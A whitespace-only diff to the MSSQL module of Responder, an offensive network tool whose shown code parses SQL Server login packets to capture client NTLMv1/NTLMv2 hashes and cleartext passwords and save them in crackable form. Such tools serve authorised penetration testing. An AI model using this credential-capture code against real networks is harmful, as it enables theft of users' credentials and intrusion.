@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# This file is part of Responder, a network take-over set of tools 
+# This file is part of Responder, a network take-over set of tools
 # created and maintained by the watchers.
 # email: providence@tao.oga
 # This program is free software: you can redistribute it and/or modify
@@ -27,7 +27,7 @@ from packets import MSSQLPreLoginAnswer, MSSQLNTLMChallengeAnswer
 
 class TDS_Login_Packet:
 	def __init__(self, data):
-		
+
 		ClientNameOff     = struct.unpack('<h', data[44:46])[0]
 		ClientNameLen     = struct.unpack('<h', data[46:48])[0]
 		UserNameOff       = struct.unpack('<h', data[48:50])[0]
@@ -70,7 +70,7 @@ def ParseSQLHash(data, client, Challenge):
 	DomainLen     = struct.unpack('<H',data[36:38])[0]
 	DomainOffset  = struct.unpack('<H',data[40:42])[0]
 	Domain        = SSPIStart[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
-	
+
 	UserLen       = struct.unpack('<H',data[44:46])[0]
 	UserOffset    = struct.unpack('<H',data[48:50])[0]
 	User          = SSPIStart[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
@@ -79,23 +79,23 @@ def ParseSQLHash(data, client, Challenge):
 		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, LMHash, NTHash, codecs.encode(Challenge,'hex').decode('latin-1'))
 
 		SaveToDb({
-			'module': 'MSSQL', 
-			'type': 'NTLMv1', 
-			'client': client, 
-			'user': Domain+'\\'+User, 
-			'hash': LMHash+":"+NTHash, 
+			'module': 'MSSQL',
+			'type': 'NTLMv1',
+			'client': client,
+			'user': Domain+'\\'+User,
+			'hash': LMHash+":"+NTHash,
 			'fullhash': WriteHash,
 		})
 
 	if NthashLen > 60:
 		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, codecs.encode(Challenge,'hex').decode('latin-1'), NTHash[:32], NTHash[32:])
-		
+
 		SaveToDb({
-			'module': 'MSSQL', 
-			'type': 'NTLMv2', 
-			'client': client, 
-			'user': Domain+'\\'+User, 
-			'hash': NTHash[:32]+":"+NTHash[32:], 
+			'module': 'MSSQL',
+			'type': 'NTLMv2',
+			'client': client,
+			'user': Domain+'\\'+User,
+			'hash': NTHash[:32]+":"+NTHash[32:],
 			'fullhash': WriteHash,
 		})
 
@@ -111,19 +111,19 @@ def ParseSqlClearTxtPwd(Pwd):
 def ParseClearTextSQLPass(data, client):
 	TDS = TDS_Login_Packet(data)
 	SaveToDb({
-		'module': 'MSSQL', 
-		'type': 'Cleartext', 
+		'module': 'MSSQL',
+		'type': 'Cleartext',
 		'client': client,
 		'hostname': "%s (%s)" % (TDS.ServerName, TDS.DatabaseName),
-		'user': TDS.UserName, 
-		'cleartext': ParseSqlClearTxtPwd(TDS.Password), 
+		'user': TDS.UserName,
+		'cleartext': ParseSqlClearTxtPwd(TDS.Password),
 		'fullhash': TDS.UserName +':'+ ParseSqlClearTxtPwd(TDS.Password),
 	})
 
 # MSSQL Server class
 class MSSQL(BaseRequestHandler):
 	def handle(self):
-	
+
 		try:
 			self.ntry = 0
 			while True:
